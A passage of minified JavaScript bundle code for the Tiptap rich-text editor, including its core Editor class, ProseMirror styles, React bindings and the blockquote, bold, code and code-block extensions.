l=o[a];if(s[l]!==n[l])break}}else r=i;i=i.parent}return r}querySelector(e,n={}){return this.querySelectorAll(e,n,!0)[0]||null}querySelectorAll(e,n={},r=!1){let i=[];if(!this.children||this.children.length===0)return i;const s=Object.keys(n);return this.children.forEach(o=>{r&&i.length>0||(o.node.type.name===e&&s.every(l=>n[l]===o.node.attrs[l])&&i.push(o),!(r&&i.length>0)&&(i=i.concat(o.querySelectorAll(e,n,r))))}),i}setAttribute(e){const{tr:n}=this.editor.state;n.setNodeMarkup(this.from,void 0,{...this.node.attrs,...e}),this.editor.view.dispatch(n)}},bV=`.ProseMirror {
  position: relative;
}

.ProseMirror {
  word-wrap: break-word;
  white-space: pre-wrap;
  white-space: break-spaces;
  -webkit-font-variant-ligatures: none;
  font-variant-ligatures: none;
  font-feature-settings: "liga" 0; /* the above doesn't seem to work in Edge */
}

.ProseMirror [contenteditable="false"] {
  white-space: normal;
}

.ProseMirror [contenteditable="false"] [contenteditable="true"] {
  white-space: pre-wrap;
}

.ProseMirror pre {
  white-space: pre-wrap;
}

img.ProseMirror-separator {
  display: inline !important;
  border: none !important;
  margin: 0 !important;
  width: 0 !important;
  height: 0 !important;
}

.ProseMirror-gapcursor {
  display: none;
  pointer-events: none;
  position: absolute;
  margin: 0;
}

.ProseMirror-gapcursor:after {
  content: "";
  display: block;
  position: absolute;
  top: -2px;
  width: 20px;
  border-top: 1px solid black;
  animation: ProseMirror-cursor-blink 1.1s steps(2, start) infinite;
}

@keyframes ProseMirror-cursor-blink {
  to {
    visibility: hidden;
  }
}

.ProseMirror-hideselection *::selection {
  background: transparent;
}

.ProseMirror-hideselection *::-moz-selection {
  background: transparent;
}

.ProseMirror-hideselection * {
  caret-color: transparent;
}

.ProseMirror-focused .ProseMirror-gapcursor {
  display: block;
}`;function CV(t,e,n){const r=document.querySelector("style[data-tiptap-style]");if(r!==null)return r;const i=document.createElement("style");return e&&i.setAttribute("nonce",e),i.setAttribute("data-tiptap-style",""),i.innerHTML=t,document.getElementsByTagName("head")[0].appendChild(i),i}var EV=class extends zF{constructor(t={}){super(),this.css=null,this.editorView=null,this.isFocused=!1,this.isInitialized=!1,this.extensionStorage={},this.instanceId=Math.random().toString(36).slice(2,9),this.options={element:typeof document<"u"?document.createElement("div"):null,content:"",injectCSS:!0,injectNonce:void 0,extensions:[],autofocus:!1,editable:!0,editorProps:{},parseOptions:{},coreExtensionOptions:{},enableInputRules:!0,enablePasteRules:!0,enableCoreExtensions:!0,enableContentCheck:!1,emitContentError:!1,onBeforeCreate:()=>null,onCreate:()=>null,onUpdate:()=>null,onSelectionUpdate:()=>null,onTransaction:()=>null,onFocus:()=>null,onBlur:()=>null,onDestroy:()=>null,onContentError:({error:r})=>{throw r},onPaste:()=>null,onDrop:()=>null,onDelete:()=>null},this.isCapturingTransaction=!1,this.capturedTransaction=null,this.setOptions(t),this.createExtensionManager(),this.createCommandManager(),this.createSchema(),this.on("beforeCreate",this.options.onBeforeCreate),this.emit("beforeCreate",{editor:this}),this.on("contentError",this.options.onContentError),this.on("create",this.options.onCreate),this.on("update",this.options.onUpdate),this.on("selectionUpdate",this.options.onSelectionUpdate),this.on("transaction",this.options.onTransaction),this.on("focus",this.options.onFocus),this.on("blur",this.options.onBlur),this.on("destroy",this.options.onDestroy),this.on("drop",({event:r,slice:i,moved:s})=>this.options.onDrop(r,i,s)),this.on("paste",({event:r,slice:i})=>this.options.onPaste(r,i)),this.on("delete",this.options.onDelete);const e=this.createDoc(),n=FE(e,this.options.autofocus);this.editorState=ts.create({doc:e,schema:this.schema,selection:n||void 0}),this.options.element&&this.mount(this.options.element)}mount(t){if(typeof document>"u")throw new Error("[tiptap error]: The editor cannot be mounted because there is no 'document' defined in this environment.");this.createView(t),window.setTimeout(()=>{this.isDestroyed||(this.commands.focus(this.options.autofocus),this.emit("create",{editor:this}),this.isInitialized=!0)},0)}unmount(){if(this.editorView){const t=this.editorView.dom;t!=null&&t.editor&&delete t.editor,this.editorView.destroy()}if(this.editorView=null,this.isInitialized=!1,this.css)try{typeof this.css.remove=="function"?this.css.remove():this.css.parentNode&&this.css.parentNode.removeChild(this.css)}catch(t){console.warn("Failed to remove CSS element:",t)}this.css=null}get storage(){return this.extensionStorage}get commands(){return this.commandManager.commands}chain(){return this.commandManager.chain()}can(){return this.commandManager.can()}injectCSS(){this.options.injectCSS&&typeof document<"u"&&(this.css=CV(bV,this.options.injectNonce))}setOptions(t={}){this.options={...this.options,...t},!(!this.editorView||!this.state||this.isDestroyed)&&(this.options.editorProps&&this.view.setProps(this.options.editorProps),this.view.updateState(this.state))}setEditable(t,e=!0){this.setOptions({editable:t}),e&&this.emit("update",{editor:this,transaction:this.state.tr,appendedTransactions:[]})}get isEditable(){return this.options.editable&&this.view&&this.view.editable}get view(){return this.editorView?this.editorView:new Proxy({state:this.editorState,updateState:t=>{this.editorState=t},dispatch:t=>{this.editorState=this.state.apply(t)},composing:!1,dragging:null,editable:!0,isDestroyed:!1},{get:(t,e)=>{if(e==="state")return this.editorState;if(e in t)return Reflect.get(t,e);throw new Error(`[tiptap error]: The editor view is not available. Cannot access view['${e}']. The editor may not be mounted yet.`)}})}get state(){return this.editorView&&(this.editorState=this.view.state),this.editorState}registerPlugin(t,e){const n=TE(e)?e(t,[...this.state.plugins]):[...this.state.plugins,t],r=this.state.reconfigure({plugins:n});return this.view.updateState(r),r}unregisterPlugin(t){if(this.isDestroyed)return;const e=this.state.plugins;let n=e;if([].concat(t).forEach(i=>{const s=typeof i=="string"?`${i}$`:i.key;n=n.filter(o=>!o.key.startsWith(s))}),e.length===n.length)return;const r=this.state.reconfigure({plugins:n});return this.view.updateState(r),r}createExtensionManager(){var t,e;const r=[...this.options.enableCoreExtensions?[qE,_E.configure({blockSeparator:(e=(t=this.options.coreExtensionOptions)==null?void 0:t.clipboardTextSerializer)==null?void 0:e.blockSeparator}),UE,JE,YE,XE,KE,QE,WE].filter(i=>typeof this.options.enableCoreExtensions=="object"?this.options.enableCoreExtensions[i.name]!==!1:!0):[],...this.options.extensions].filter(i=>["extension","node","mark"].includes(i==null?void 0:i.type));this.extensionManager=new rd(r,this)}createCommandManager(){this.commandManager=new Xc({editor:this})}createSchema(){this.schema=this.extensionManager.schema}createDoc(){let t;try{t=up(this.options.content,this.schema,this.options.parseOptions,{errorOnInvalidContent:this.options.enableContentCheck})}catch(e){if(!(e instanceof Error)||!["[tiptap error]: Invalid JSON content","[tiptap error]: Invalid HTML content"].includes(e.message))throw e;this.emit("contentError",{editor:this,error:e,disableCollaboration:()=>{"collaboration"in this.storage&&typeof this.storage.collaboration=="object"&&this.storage.collaboration&&(this.storage.collaboration.isDisabled=!0),this.options.extensions=this.options.extensions.filter(n=>n.name!=="collaboration"),this.createExtensionManager()}}),t=up(this.options.content,this.schema,this.options.parseOptions,{errorOnInvalidContent:!1})}return t}createView(t){var e;this.editorView=new mE(t,{...this.options.editorProps,attributes:{role:"textbox",...(e=this.options.editorProps)==null?void 0:e.attributes},dispatchTransaction:this.dispatchTransaction.bind(this),state:this.editorState});const n=this.state.reconfigure({plugins:this.extensionManager.plugins});this.view.updateState(n),this.createNodeViews(),this.prependClass(),this.injectCSS();const r=this.view.dom;r.editor=this}createNodeViews(){this.view.isDestroyed||this.view.setProps({markViews:this.extensionManager.markViews,nodeViews:this.extensionManager.nodeViews})}prependClass(){this.view.dom.className=`tiptap ${this.view.dom.className}`}captureTransaction(t){this.isCapturingTransaction=!0,t(),this.isCapturingTransaction=!1;const e=this.capturedTransaction;return this.capturedTransaction=null,e}dispatchTransaction(t){if(this.view.isDestroyed)return;if(this.isCapturingTransaction){if(!this.capturedTransaction){this.capturedTransaction=t;return}t.steps.forEach(u=>{var c;return(c=this.capturedTransaction)==null?void 0:c.step(u)});return}const{state:e,transactions:n}=this.state.applyTransaction(t),r=!this.state.selection.eq(e.selection),i=n.includes(t),s=this.state;if(this.emit("beforeTransaction",{editor:this,transaction:t,nextState:e}),!i)return;this.view.updateState(e),this.emit("transaction",{editor:this,transaction:t,appendedTransactions:n.slice(1)}),r&&this.emit("selectionUpdate",{editor:this,transaction:t});const o=n.findLast(u=>u.getMeta("focus")||u.getMeta("blur")),a=o==null?void 0:o.getMeta("focus"),l=o==null?void 0:o.getMeta("blur");a&&this.emit("focus",{editor:this,event:a.event,transaction:o}),l&&this.emit("blur",{editor:this,event:l.event,transaction:o}),!(t.getMeta("preventUpdate")||!n.some(u=>u.docChanged)||s.doc.eq(e.doc))&&this.emit("update",{editor:this,transaction:t,appendedTransactions:n.slice(1)})}getAttributes(t){return OE(this.state,t)}isActive(t,e){const n=typeof t=="string"?t:null,r=typeof t=="string"?e:t;return eB(this.state,n,r)}getJSON(){return this.state.doc.toJSON()}getHTML(){return Ag(this.state.doc.content,this.schema)}getText(t){const{blockSeparator:e=`

`,textSerializers:n={}}=t||{};return GF(this.state.doc,{blockSeparator:e,textSerializers:{...PE(this.schema),...n}})}get isEmpty(){return td(this.state.doc)}destroy(){this.emit("destroy"),this.unmount(),this.removeAllListeners()}get isDestroyed(){var t,e;return(e=(t=this.editorView)==null?void 0:t.isDestroyed)!=null?e:!0}$node(t,e){var n;return((n=this.$doc)==null?void 0:n.querySelector(t,e))||null}$nodes(t,e){var n;return((n=this.$doc)==null?void 0:n.querySelectorAll(t,e))||null}$pos(t){const e=this.state.doc.resolve(t);return new kV(e,this)}get $doc(){return this.$pos(0)}};function Ns(t){return new nd({find:t.find,handler:({state:e,range:n,match:r})=>{const i=X(t.getAttributes,void 0,r);if(i===!1||i===null)return null;const{tr:s}=e,o=r[r.length-1],a=r[0];if(o){const l=a.search(/\S/),u=n.from+a.indexOf(o),c=u+o.length;if(Dg(n.from,n.to,e.doc).filter(h=>h.mark.type.excluded.find(y=>y===t.type&&y!==h.mark.type)).filter(h=>h.to>u).length)return null;c<n.to&&s.delete(c,n.to),u>n.from&&s.delete(n.from+l,u);const f=n.from+l+o.length;s.addMark(n.from+l,f,t.type.create(i||{})),s.removeStoredMark(t.type)}}})}function TV(t){return new nd({find:t.find,handler:({state:e,range:n,match:r})=>{const i=X(t.getAttributes,void 0,r)||{},{tr:s}=e,o=n.from;let a=n.to;const l=t.type.create(i);if(r[1]){const u=r[0].lastIndexOf(r[1]);let c=o+u;c>a?c=a:a=c+r[1].length;const d=r[0][r[0].length-1];s.insertText(d,o+r[0].length-1),s.replaceWith(c,a,l)}else if(r[0]){const u=t.type.isInline?o:o-1;s.insert(u,t.type.create(i)).delete(s.mapping.map(o),s.mapping.map(a))}s.scrollIntoView()}})}function dp(t){return new nd({find:t.find,handler:({state:e,range:n,match:r})=>{const i=e.doc.resolve(n.from),s=X(t.getAttributes,void 0,r)||{};if(!i.node(-1).canReplaceWith(i.index(-1),i.indexAfter(-1),t.type))return null;e.tr.delete(n.from,n.to).setBlockType(n.from,n.from,t.type,s)}})}function As(t){return new nd({find:t.find,handler:({state:e,range:n,match:r,chain:i})=>{const s=X(t.getAttributes,void 0,r)||{},o=e.tr.delete(n.from,n.to),l=o.doc.resolve(n.from).blockRange(),u=l&&mg(l,t.type,s);if(!u)return null;if(o.wrap(l,u),t.keepMarks&&t.editor){const{selection:d,storedMarks:f}=e,{splittableMarks:h}=t.editor.extensionManager,p=f||d.$to.parentOffset&&d.$from.marks();if(p){const y=p.filter(x=>h.includes(x.type.name));o.ensureMarks(y)}}if(t.keepAttributes){const d=t.type.name==="bulletList"||t.type.name==="orderedList"?"listItem":"taskList";i().updateAttributes(d,s).run()}const c=o.doc.resolve(n.from-1).nodeBefore;c&&c.type===t.type&&Vr(o.doc,n.from-1)&&(!t.joinPredicate||t.joinPredicate(r,c))&&o.join(n.from-1)}})}function MV(t,e){const{selection:n}=t,{$from:r}=n;if(n instanceof V){const s=r.index();return r.parent.canReplaceWith(s,s+1,e)}let i=r.depth;for(;i>=0;){const s=r.index(i);if(r.node(i).contentMatchAt(s).matchType(e))return!0;i-=1}return!1}function NV(t,e,n={}){const{state:r}=e,{doc:i,tr:s}=r,o=t;i.descendants((a,l)=>{const u=s.mapping.map(l),c=s.mapping.map(l)+a.nodeSize;let d=null;if(a.marks.forEach(h=>{if(h!==o)return!1;d=h}),!d)return;let f=!1;if(Object.keys(n).forEach(h=>{n[h]!==d.attrs[h]&&(f=!0)}),f){const h=t.type.create({...t.attrs,...n});s.removeMark(u,c,t.type),s.addMark(u,c,h)}}),s.docChanged&&e.view.dispatch(s)}var Ot=class ZE extends Lg{constructor(){super(...arguments),this.type="node"}static create(e={}){const n=typeof e=="function"?e():e;return new ZE(n)}configure(e){return super.configure(e)}extend(e){const n=typeof e=="function"?e():e;return super.extend(n)}};function Ei(t){return new lB({find:t.find,handler:({state:e,range:n,match:r,pasteEvent:i})=>{const s=X(t.getAttributes,void 0,r,i);if(s===!1||s===null)return null;const{tr:o}=e,a=r[r.length-1],l=r[0];let u=n.to;if(a){const c=l.search(/\S/),d=n.from+l.indexOf(a),f=d+a.length;if(Dg(n.from,n.to,e.doc).filter(p=>p.mark.type.excluded.find(x=>x===t.type&&x!==p.mark.type)).filter(p=>p.to>d).length)return null;f<n.to&&o.delete(f,n.to),d>n.from&&o.delete(n.from+c,d),u=n.from+c+a.length,o.addMark(n.from+c,u,t.type.create(s||{})),o.removeStoredMark(t.type)}}})}var AV=function t(e,n){if(e===n)return!0;if(e&&n&&typeof e=="object"&&typeof n=="object"){if(e.constructor!==n.constructor)return!1;var r,i,s;if(Array.isArray(e)){if(r=e.length,r!=n.length)return!1;for(i=r;i--!==0;)if(!t(e[i],n[i]))return!1;return!0}if(e instanceof Map&&n instanceof Map){if(e.size!==n.size)return!1;for(i of e.entries())if(!n.has(i[0]))return!1;for(i of e.entries())if(!t(i[1],n.get(i[0])))return!1;return!0}if(e instanceof Set&&n instanceof Set){if(e.size!==n.size)return!1;for(i of e.entries())if(!n.has(i[0]))return!1;return!0}if(ArrayBuffer.isView(e)&&ArrayBuffer.isView(n)){if(r=e.length,r!=n.length)return!1;for(i=r;i--!==0;)if(e[i]!==n[i])return!1;return!0}if(e.constructor===RegExp)return e.source===n.source&&e.flags===n.flags;if(e.valueOf!==Object.prototype.valueOf)return e.valueOf()===n.valueOf();if(e.toString!==Object.prototype.toString)return e.toString()===n.toString();if(s=Object.keys(e),r=s.length,r!==Object.keys(n).length)return!1;for(i=r;i--!==0;)if(!Object.prototype.hasOwnProperty.call(n,s[i]))return!1;for(i=r;i--!==0;){var o=s[i];if(!(o==="_owner"&&e.$$typeof)&&!t(e[o],n[o]))return!1}return!0}return e!==e&&n!==n};const PV=bp(AV);var eT={exports:{}},tT={};/**
 * @license React
 * use-sync-external-store-shim/with-selector.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var id=S,RV=fg;function OV(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var DV=typeof Object.is=="function"?Object.is:OV,LV=RV.useSyncExternalStore,IV=id.useRef,jV=id.useEffect,FV=id.useMemo,BV=id.useDebugValue;tT.useSyncExternalStoreWithSelector=function(t,e,n,r,i){var s=IV(null);if(s.current===null){var o={hasValue:!1,value:null};s.current=o}else o=s.current;s=FV(function(){function l(h){if(!u){if(u=!0,c=h,h=r(h),i!==void 0&&o.hasValue){var p=o.value;if(i(p,h))return d=p}return d=h}if(p=d,DV(c,h))return p;var y=r(h);return i!==void 0&&i(p,y)?(c=h,p):(c=h,d=y)}var u=!1,c,d,f=n===void 0?null:n;return[function(){return l(e())},f===null?void 0:function(){return l(f())}]},[e,n,r,i]);var a=LV(t,s[0],s[1]);return jV(function(){o.hasValue=!0,o.value=a},[a]),BV(a),a};eT.exports=tT;var VV=eT.exports,zV=(...t)=>e=>{t.forEach(n=>{typeof n=="function"?n(e):n&&(n.current=e)})},_V=({contentComponent:t})=>{const e=fg.useSyncExternalStore(t.subscribe,t.getSnapshot,t.getServerSnapshot);return m.jsx(m.Fragment,{children:Object.values(e)})};function $V(){const t=new Set;let e={};return{subscribe(n){return t.add(n),()=>{t.delete(n)}},getSnapshot(){return e},getServerSnapshot(){return e},setRenderer(n,r){e={...e,[n]:n2.createPortal(r.reactElement,r.element,n)},t.forEach(i=>i())},removeRenderer(n){const r={...e};delete r[n],e=r,t.forEach(i=>i())}}}var HV=class extends zt.Component{constructor(t){var e;super(t),this.editorContentRef=zt.createRef(),this.initialized=!1,this.state={hasContentComponentInitialized:!!((e=t.editor)!=null&&e.contentComponent)}}componentDidMount(){this.init()}componentDidUpdate(){this.init()}init(){const t=this.props.editor;if(t&&!t.isDestroyed&&t.options.element){if(t.contentComponent)return;const e=this.editorContentRef.current;e.append(...t.options.element.childNodes),t.setOptions({element:e}),t.contentComponent=$V(),this.state.hasContentComponentInitialized||(this.unsubscribeToContentComponent=t.contentComponent.subscribe(()=>{this.setState(n=>n.hasContentComponentInitialized?n:{hasContentComponentInitialized:!0}),this.unsubscribeToContentComponent&&this.unsubscribeToContentComponent()})),t.createNodeViews(),this.initialized=!0}}componentWillUnmount(){var t;const e=this.props.editor;if(!e||(this.initialized=!1,e.isDestroyed||e.view.setProps({nodeViews:{}}),this.unsubscribeToContentComponent&&this.unsubscribeToContentComponent(),e.contentComponent=null,!((t=e.options.element)!=null&&t.firstChild)))return;const n=document.createElement("div");n.append(...e.options.element.childNodes),e.setOptions({element:n})}render(){const{editor:t,innerRef:e,...n}=this.props;return m.jsxs(m.Fragment,{children:[m.jsx("div",{ref:zV(e,this.editorContentRef),...n}),(t==null?void 0:t.contentComponent)&&m.jsx(_V,{contentComponent:t.contentComponent})]})}},UV=S.forwardRef((t,e)=>{const n=zt.useMemo(()=>Math.floor(Math.random()*4294967295).toString(),[t.editor]);return zt.createElement(HV,{key:n,innerRef:e,...t})}),WV=zt.memo(UV),KV=typeof window<"u"?S.useLayoutEffect:S.useEffect,qV=class{constructor(t){this.transactionNumber=0,this.lastTransactionNumber=0,this.subscribers=new Set,this.editor=t,this.lastSnapshot={editor:t,transactionNumber:0},this.getSnapshot=this.getSnapshot.bind(this),this.getServerSnapshot=this.getServerSnapshot.bind(this),this.watch=this.watch.bind(this),this.subscribe=this.subscribe.bind(this)}getSnapshot(){return this.transactionNumber===this.lastTransactionNumber?this.lastSnapshot:(this.lastTransactionNumber=this.transactionNumber,this.lastSnapshot={editor:this.editor,transactionNumber:this.transactionNumber},this.lastSnapshot)}getServerSnapshot(){return{editor:null,transactionNumber:0}}subscribe(t){return this.subscribers.add(t),()=>{this.subscribers.delete(t)}}watch(t){if(this.editor=t,this.editor){const e=()=>{this.transactionNumber+=1,this.subscribers.forEach(r=>r())},n=this.editor;return n.on("transaction",e),()=>{n.off("transaction",e)}}}};function GV(t){var e;const[n]=S.useState(()=>new qV(t.editor)),r=VV.useSyncExternalStoreWithSelector(n.subscribe,n.getSnapshot,n.getServerSnapshot,t.selector,(e=t.equalityFn)!=null?e:PV);return KV(()=>n.watch(t.editor),[t.editor,n]),S.useDebugValue(r),r}var JV=!1,fp=typeof window>"u",YV=fp||!!(typeof window<"u"&&window.next),QV=class nT{constructor(e){this.editor=null,this.subscriptions=new Set,this.isComponentMounted=!1,this.previousDeps=null,this.instanceId="",this.options=e,this.subscriptions=new Set,this.setEditor(this.getInitialEditor()),this.scheduleDestroy(),this.getEditor=this.getEditor.bind(this),this.getServerSnapshot=this.getServerSnapshot.bind(this),this.subscribe=this.subscribe.bind(this),this.refreshEditorInstance=this.refreshEditorInstance.bind(this),this.scheduleDestroy=this.scheduleDestroy.bind(this),this.onRender=this.onRender.bind(this),this.createEditor=this.createEditor.bind(this)}setEditor(e){this.editor=e,this.instanceId=Math.random().toString(36).slice(2,9),this.subscriptions.forEach(n=>n())}getInitialEditor(){if(this.options.current.immediatelyRender===void 0)return fp||YV?null:this.createEditor();if(this.options.current.immediatelyRender&&fp&&JV)throw new Error("Tiptap Error: SSR has been detected, and `immediatelyRender` has been set to `true` this is an unsupported configuration that may result in errors, explicitly set `immediatelyRender` to `false` to avoid hydration mismatches.");return this.options.current.immediatelyRender?this.createEditor():null}createEditor(){const e={...this.options.current,onBeforeCreate:(...r)=>{var i,s;return(s=(i=this.options.current).onBeforeCreate)==null?void 0:s.call(i,...r)},onBlur:(...r)=>{var i,s;return(s=(i=this.options.current).onBlur)==null?void 0:s.call(i,...r)},onCreate:(...r)=>{var i,s;return(s=(i=this.options.current).onCreate)==null?void 0:s.call(i,...r)},onDestroy:(...r)=>{var i,s;return(s=(i=this.options.current).onDestroy)==null?void 0:s.call(i,...r)},onFocus:(...r)=>{var i,s;return(s=(i=this.options.current).onFocus)==null?void 0:s.call(i,...r)},onSelectionUpdate:(...r)=>{var i,s;return(s=(i=this.options.current).onSelectionUpdate)==null?void 0:s.call(i,...r)},onTransaction:(...r)=>{var i,s;return(s=(i=this.options.current).onTransaction)==null?void 0:s.call(i,...r)},onUpdate:(...r)=>{var i,s;return(s=(i=this.options.current).onUpdate)==null?void 0:s.call(i,...r)},onContentError:(...r)=>{var i,s;return(s=(i=this.options.current).onContentError)==null?void 0:s.call(i,...r)},onDrop:(...r)=>{var i,s;return(s=(i=this.options.current).onDrop)==null?void 0:s.call(i,...r)},onPaste:(...r)=>{var i,s;return(s=(i=this.options.current).onPaste)==null?void 0:s.call(i,...r)},onDelete:(...r)=>{var i,s;return(s=(i=this.options.current).onDelete)==null?void 0:s.call(i,...r)}};return new EV(e)}getEditor(){return this.editor}getServerSnapshot(){return null}subscribe(e){return this.subscriptions.add(e),()=>{this.subscriptions.delete(e)}}static compareOptions(e,n){return Object.keys(e).every(r=>["onCreate","onBeforeCreate","onDestroy","onUpdate","onTransaction","onFocus","onBlur","onSelectionUpdate","onContentError","onDrop","onPaste"].includes(r)?!0:r==="extensions"&&e.extensions&&n.extensions?e.extensions.length!==n.extensions.length?!1:e.extensions.every((i,s)=>{var o;return i===((o=n.extensions)==null?void 0:o[s])}):e[r]===n[r])}onRender(e){return()=>(this.isComponentMounted=!0,clearTimeout(this.scheduledDestructionTimeout),this.editor&&!this.editor.isDestroyed&&e.length===0?nT.compareOptions(this.options.current,this.editor.options)||this.editor.setOptions({...this.options.current,editable:this.editor.isEditable}):this.refreshEditorInstance(e),()=>{this.isComponentMounted=!1,this.scheduleDestroy()})}refreshEditorInstance(e){if(this.editor&&!this.editor.isDestroyed){if(this.previousDeps===null){this.previousDeps=e;return}if(this.previousDeps.length===e.length&&this.previousDeps.every((r,i)=>r===e[i]))return}this.editor&&!this.editor.isDestroyed&&this.editor.destroy(),this.setEditor(this.createEditor()),this.previousDeps=e}scheduleDestroy(){const e=this.instanceId,n=this.editor;this.scheduledDestructionTimeout=setTimeout(()=>{if(this.isComponentMounted&&this.instanceId===e){n&&n.setOptions(this.options.current);return}n&&!n.isDestroyed&&(n.destroy(),this.instanceId===e&&this.setEditor(null))},1)}};function XV(t={},e=[]){const n=S.useRef(t);n.current=t;const[r]=S.useState(()=>new QV(n)),i=fg.useSyncExternalStore(r.subscribe,r.getEditor,r.getServerSnapshot);return S.useDebugValue(i),S.useEffect(r.onRender(e)),GV({editor:i,selector:({transactionNumber:s})=>t.shouldRerenderOnTransaction===!1||t.shouldRerenderOnTransaction===void 0?null:t.immediatelyRender&&s===0?0:s+1}),i}var ZV=S.createContext({editor:null});ZV.Consumer;var ez=S.createContext({onDragStart:()=>{},nodeViewContentChildren:void 0,nodeViewContentRef:()=>{}}),tz=()=>S.useContext(ez);zt.forwardRef((t,e)=>{const{onDragStart:n}=tz(),r=t.as||"div";return m.jsx(r,{...t,ref:e,"data-node-view-wrapper":"",onDragStart:n,style:{whiteSpace:"normal",...t.style}})});zt.createContext({markViewContentRef:()=>{}});var zu=(t,e)=>{if(t==="slot")return 0;if(t instanceof Function)return t(e);const{children:n,...r}=e??{};if(t==="svg")throw new Error("SVG elements are not supported in the JSX syntax, use the array syntax instead");return[t,r,n]},nz=/^\s*>\s$/,rz=Ot.create({name:"blockquote",addOptions(){return{HTMLAttributes:{}}},content:"block+",group:"block",defining:!0,parseHTML(){return[{tag:"blockquote"}]},renderHTML({HTMLAttributes:t}){return zu("blockquote",{...Me(this.options.HTMLAttributes,t),children:zu("slot",{})})},addCommands(){return{setBlockquote:()=>({commands:t})=>t.wrapIn(this.name),toggleBlockquote:()=>({commands:t})=>t.toggleWrap(this.name),unsetBlockquote:()=>({commands:t})=>t.lift(this.name)}},addKeyboardShortcuts(){return{"Mod-Shift-b":()=>this.editor.commands.toggleBlockquote()}},addInputRules(){return[As({find:nz,type:this.type})]}}),iz=/(?:^|\s)(\*\*(?!\s+\*\*)((?:[^*]+))\*\*(?!\s+\*\*))$/,sz=/(?:^|\s)(\*\*(?!\s+\*\*)((?:[^*]+))\*\*(?!\s+\*\*))/g,oz=/(?:^|\s)(__(?!\s+__)((?:[^_]+))__(?!\s+__))$/,az=/(?:^|\s)(__(?!\s+__)((?:[^_]+))__(?!\s+__))/g,lz=Pi.create({name:"bold",addOptions(){return{HTMLAttributes:{}}},parseHTML(){return[{tag:"strong"},{tag:"b",getAttrs:t=>t.style.fontWeight!=="normal"&&null},{style:"font-weight=400",clearMark:t=>t.type.name===this.name},{style:"font-weight",getAttrs:t=>/^(bold(er)?|[5-9]\d{2,})$/.test(t)&&null}]},renderHTML({HTMLAttributes:t}){return zu("strong",{...Me(this.options.HTMLAttributes,t),children:zu("slot",{})})},addCommands(){return{setBold:()=>({commands:t})=>t.setMark(this.name),toggleBold:()=>({commands:t})=>t.toggleMark(this.name),unsetBold:()=>({commands:t})=>t.unsetMark(this.name)}},addKeyboardShortcuts(){return{"Mod-b":()=>this.editor.commands.toggleBold(),"Mod-B":()=>this.editor.commands.toggleBold()}},addInputRules(){return[Ns({find:iz,type:this.type}),Ns({find:oz,type:this.type})]},addPasteRules(){return[Ei({find:sz,type:this.type}),Ei({find:az,type:this.type})]}}),uz=/(^|[^`])`([^`]+)`(?!`)/,cz=/(^|[^`])`([^`]+)`(?!`)/g,dz=Pi.create({name:"code",addOptions(){return{HTMLAttributes:{}}},excludes:"_",code:!0,exitable:!0,parseHTML(){return[{tag:"code"}]},renderHTML({HTMLAttributes:t}){return["code",Me(this.options.HTMLAttributes,t),0]},addCommands(){return{setCode:()=>({commands:t})=>t.setMark(this.name),toggleCode:()=>({commands:t})=>t.toggleMark(this.name),unsetCode:()=>({commands:t})=>t.unsetMark(this.name)}},addKeyboardShortcuts(){return{"Mod-e":()=>this.editor.commands.toggleCode()}},addInputRules(){return[Ns({find:uz,type:this.type})]},addPasteRules(){return[Ei({find:cz,type:this.type})]}}),fz=/^```([a-z]+)?[\s\n]$/,hz=/^~~~([a-z]+)?[\s\n]$/,pz=Ot.create({name:"codeBlock",addOptions(){return{languageClassPrefix:"language-",exitOnTripleEnter:!0,exitOnArrowDown:!0,defaultLanguage:null,HTMLAttributes:{}}},content:"text*",marks:"",group:"block",code:!0,defining:!0,addAttributes(){return{language:{default:this.options.defaultLanguage,parseHTML:t=>{var e;const{languageClassPrefix:n}=this.options,s=[...((e=t.firstElementChild)==null?void 0:e.classList)||[]].filter(o=>o.startsWith(n)).map(o=>o.replace(n,""))[0];return s||null},rendered:!1}}},parseHTML(){return[{tag:"pre",preserveWhitespace:"full"}]},renderHTML({node:t,HTMLAttributes:e}){return["pre",Me(this.options.HTMLAttributes,e),["code",{class:t.attrs.language?this.options.languageClassPrefix+t.attrs.language:null},0]]},addCommands(){return{setCodeBlock:t=>({commands:e})=>e.setNode(this.name,t),toggleCodeBlock:t=>({commands:e})=>e.toggleNode(this.name,"paragraph",t)}},addKeyboardShortcuts(){return{"Mod-Alt-c":()=>this.editor.commands.toggleCodeBlock(),Backspace:()=>{const{empty:t,$anchor:e}=this.editor.state.selection,n=e.pos===1;return!t||e.parent.type.name!==this.name?!1:n||!e.parent.textContent.length?this.editor.commands.clearNodes():!1},Enter:({editor:t})=>{if(!this.options.exitOnTripleEnter)return!1;const{state:e}=t,{selection:n}=e,{$from:r,empty:i}=n;if(!i||r.parent.type!==this.type)return!1;const s=r.parentOffset===r.parent.nodeSize-2,o=r.parent.textContent.endsWith(`

`);return!s||!o?!1:t.chain().command(({tr:a})=>(a.delete(r.pos-2,r.pos),!0)).exitCode().run()},ArrowDown:({editor:t})=>{if(!this.options.exitOnArrowDown)return!1;const{state:e}=t,{selection:n,doc:r}=e,{$from:i,empty:s}=n;if(!s||i.parent.type!==this.type||!(i.parentOffset===i.parent.nodeSize-2))return!1;const a=i.after();return a===void 0?!1:r.nodeAt(a)?t.commands.command(({tr:u})=>(u.setSelection(W.near(r.resolve(a))),!0)):t.commands.exitCode()}}},addInputRules(){return[dp({find:fz,type:this.type,getAttributes:t=>({language:t[1]})}),dp({find:hz,type:this.type,getAttributes:t=>({language:t[1]})})]},addProseMirrorPlugins(){return[new we({key:new ze("codeBlockVSCodeHandler"),props:{handlePaste:(t,e)=>{if(!e.clipboardData||this.editor.isActive(this.type.name))return!1;const n=e.clipboardData.getData("text/plain"),r=e.clipboardData.getData("vscode-editor-data"),i=r?JSON.parse(r):void 0,s=i==null?void 0:i.mode;if(!n||!s)return!1;const{tr:o,schema:a}=t.state,l=a.text(n.replace(/\r\n?/g,`
